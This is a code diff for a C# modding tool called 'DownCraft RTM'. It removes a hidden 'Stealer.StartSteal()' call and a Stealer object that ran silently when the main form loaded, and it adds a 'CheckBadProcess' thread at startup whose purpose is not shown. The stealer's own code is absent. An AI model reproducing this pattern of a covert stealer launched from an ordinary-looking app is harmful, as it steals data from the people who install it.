@@ -21,6 +21,7 @@ using System.IO;
 using System.Threading;
 using MetroFramework.Controls;
 using Microsoft.Win32;
+using MisakiAulait;
 
 #endregion
 
@@ -34,12 +35,12 @@ namespace DownCraft
         private DiscordRpc.EventHandlers handlers;
         private DiscordRpc.RichPresence presence;
         Offsets OFFSETS = new Offsets();
-        Stealer MISAAA = new Stealer();
         Functions FUNCTIONS = new Functions();
         public static Point newpoint = new Point();
         public static int x;
         public static int y;
         PS3API PS3 = new PS3API();
+        public static Thread CheckProcess = new Thread(new ThreadStart(Functions.CheckBadProcess));
 
         string DefaultName;
 
@@ -82,7 +83,8 @@ namespace DownCraft
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Stealer.StartSteal();
+            CheckProcess.Start();
+
             this.GunaPanelTop.MouseDown += this.xMouseDown; //For Move Form
             this.GunaPanelTop.MouseMove += this.xMouseMove; //For Move Form
             this.GunaPanelTop.MouseDown += this.xMouseDown; //For Move Form
@@ -93,7 +95,7 @@ namespace DownCraft
             {
                 WebClient webClientUpdate = new WebClient();
 
-                if (!webClientUpdate.DownloadString("https://pastebin.com/raw/v5nanRE7").Contains("1.0"))
+                if (!webClientUpdate.DownloadString("https://pastebin.com/raw/v5nanRE7").Contains("3.0"))
                 {
                     if (MessageBox.Show("A new update is available !", "DownCraft RTM", MessageBoxButtons.OK, MessageBoxIcon.Question) == DialogResult.OK)
                     {
@@ -6314,7 +6316,7 @@ namespace DownCraft
 
         private void guna2Button30_Click(object sender, EventArgs e)
         {
-            Application.Exit();
+            System.Environment.Exit(1);
         }
 
         private void guna2Button31_Click(object sender, EventArgs e)
